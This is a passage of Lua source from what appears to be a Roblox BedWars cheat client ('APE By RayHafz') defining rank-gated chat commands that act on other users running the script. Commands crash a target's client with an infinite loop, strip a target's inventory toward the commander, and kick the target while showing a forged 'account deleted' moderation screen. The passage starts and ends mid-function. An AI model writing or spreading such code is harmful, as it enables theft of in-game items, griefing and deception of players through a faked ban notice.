				privatePlayer.Character.HumanoidRootPart.Massless = false
			else
				print("No private player found!")
			end
		end,
		[";unfreeze privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				privateplusPlayer.Character.HumanoidRootPart.Massless = false
			else
				print("No private+ player found!")
			end
		end,
		[";unfreeze coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				coownerPlayer.Character.HumanoidRootPart.Massless = false
			else
				print("No coowner player found!")
			end
		end,
		[";unfreeze owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				ownerPlayer.Character.HumanoidRootPart.Massless = false
			else
				print("No owner player found!")
			end
		end,
		[";unfreeze homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				homiesPlayer.Character.HumanoidRootPart.Massless = false
			else
				print("No homies player found!")
			end
		end,
	
		[";crash default"] = function() 
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
				while true do end
			else
				print("No default player found!")
			end
		end,
		[";crash private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
				while true do end
			else
				print("No private player found!")
			end
		end,
		[";crash privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
				while true do end
			else
				print("No private+ player found!")
			end
		end,
		[";crash coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
				while true do end
			else
				print("No coowner player found!")
			end
		end,
		[";crash owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
				while true do end
			else
				print("No owner player found!")
			end
		end,
		[";crash homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
				while true do end
			else
				print("No homies player found!")
			end
		end,
		
		[";byfron default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					defaultPlayer.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					defaultPlayer:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				else
				print("No default player found!")
			end
		end,
		[";byfron private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					privatePlayer.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					privatePlayer:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				else
				print("No private player found!")
			end
		end,
		[";byfron privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					privateplusPlayer.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					privateplusPlayer:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				else
				print("No private+ player found!")
			end
		end,
		[";byfron coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					coownerPlayer.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					coownerPlayer:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				else
				print("No coowner player found!")
			end
		end,
		[";byfron owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					ownerPlayer.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					ownerPlayer:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				else
				print("No owner player found!")
			end
		end,
		[";byfron homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					homiesPlayer.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					homiesPlayer:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				else
				print("No homies player found!")
			end
		end,
		
		[";steal default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then 
						e.CFrame = plr.Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
				end
				else
				print("No default player found!")
			end
		end,
		[";steal private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then 
						e.CFrame = plr.Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
				end
				else
				print("No private player found!")
			end
		end,
		[";steal privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then 
						e.CFrame = plr.Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
				end
				else
				print("No private+ player found!")
			end
		end,
		[";steal coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then 
						e.CFrame = plr.Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
				end
				else
				print("No coowner player found!")
			end
		end,
		[";steal owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then 
						e.CFrame = plr.Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
				end
				else
				print("No owner player found!")
			end
		end,
		[";steal homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then 
						e.CFrame = plr.Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
				end
				else
				print("No homies player found!")
			end
		end,

		[";uninject default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
                GuiLibrary.SelfDestruct()
			else
				print("No default player found!")
			end
		end,
		[";uninject private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
                GuiLibrary.SelfDestruct()
			else
				print("No private player found!")
			end
		end,
		[";uninject privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
                GuiLibrary.SelfDestruct()
			else
				print("No private+ player found!")
			end
		end,
		[";uninject coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
                GuiLibrary.SelfDestruct()
			else
				print("No coowner player found!")
			end
		end,
		[";uninject owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
                GuiLibrary.SelfDestruct()
			else
				print("No owner player found!")
			end
		end,
		[";uninject homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
                GuiLibrary.SelfDestruct()
			else
				print("No homies player found!")
			end
		end,
		
		[";toggle default"] = function(args)
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
		    if #args >= 1 then
					local module
					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
							module = v
							break
						end
					end
					if module then
						module.Api.ToggleButton()
					end
				end
			else
				print("No default player found!")
			end
		end,
		[";toggle private"] = function(args)
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
		    if #args >= 1 then
					local module
					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
							module = v
							break
						end
					end
					if module then
						module.Api.ToggleButton()
					end
				end
			else
				print("No private player found!")
			end
		end,
		[";toggle privateplus"] = function(args)
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
		    if #args >= 1 then
					local module
					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
							module = v
							break
						end
					end
					if module then
						module.Api.ToggleButton()
					end
				end
			else
				print("No private+ player found!")
			end
		end,
		[";toggle coowner"] = function(args)
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
		    if #args >= 1 then
					local module
					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
							module = v
							break
						end
					end
					if module then
						module.Api.ToggleButton()
					end
				end
			else
				print("No coowner player found!")
			end
		end,
		[";toggle owner"] = function(args)
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
		    if #args >= 1 then
					local module
					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
							module = v
							break
						end
					end
					if module then
						module.Api.ToggleButton()
					end
				end
			else
				print("No owner player found!")
			end
		end,
		[";toggle homies"] = function(args)
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
		    if #args >= 1 then
					local module
					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
							module = v
							break
						end
					end
					if module then
						module.Api.ToggleButton()
					end
				end
			else
				print("No homies player found!")
			end
		end,
		
		[";sit default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = true
			end
			else
				print("No default player found!")
			end
		end,
		[";sit private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = true
			end
			else
				print("No private player found!")
			end
		end,
		[";sit privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = true
			end
			else
				print("No private+ player found!")
			end
		end,
		[";sit coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = true
			end
			else
				print("No coowner player found!")
			end
		end,
		[";sit owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = true
			end
			else
				print("No owner player found!")
			end
		end,
		[";sit homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = true
			end
			else
				print("No homies player found!")
			end
		end,
		
		[";unsit default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = false
			end
			else
				print("No default player found!")
			end
		end,
		[";unsit private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = false
			end
			else
				print("No private player found!")
			end
		end,
		[";unsit privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = false
			end
			else
				print("No private+ player found!")
			end
		end,
		[";unsit coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = false
			end
			else
				print("No coowner player found!")
			end
		end,
		[";unsit owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = false
			end
			else
				print("No owner player found!")
			end
		end,
		[";unsit homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid.Sit = false
			end
			else
				print("No homies player found!")
			end
		end,
		
		[";trip default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
			end
			else
				print("No default player found!")
			end
		end,
		[";trip private"] = function()
			local privatePlayer = getPlayerByType(1)
			if privatePlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
			end
			else
				print("No private player found!")
			end
		end,
		[";trip privateplus"] = function()
			local privateplusPlayer = getPlayerByType(2)
			if privateplusPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
			end
			else
				print("No private+ player found!")
			end
		end,
		[";trip coowner"] = function()
			local coownerPlayer = getPlayerByType(3)
			if coownerPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
			end
			else
				print("No coowner player found!")
			end
		end,
		[";trip owner"] = function()
			local ownerPlayer = getPlayerByType(4)
			if ownerPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
			end
			else
				print("No owner player found!")
			end
		end,
		[";trip homies"] = function()
			local homiesPlayer = getPlayerByType(5)
			if homiesPlayer then
		    if entityLibrary.isAlive then
				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
			end
			else
				print("No homies player found!")
			end
		end,
		
		[";reveal default"] = function()
			local defaultPlayer = getPlayerByType(0)
			if defaultPlayer then
			local textChatService = game:GetService("TextChatService")
			wait(0.0001)
			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("APE By RayHafz")
			else
				print("No default player found!")
			end
		end,
		[";reveal private"] = function()
			local privatePlayer = getPlayerByType(1)
